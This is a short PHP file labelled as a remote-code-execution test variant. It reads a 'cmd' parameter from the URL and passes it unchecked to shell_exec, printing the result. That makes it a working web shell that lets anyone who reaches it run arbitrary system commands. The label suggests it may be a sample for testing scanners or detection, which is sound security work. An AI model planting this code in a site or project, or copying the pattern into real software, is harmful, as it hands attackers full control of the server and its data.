<?php
// RCE test variation #26
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>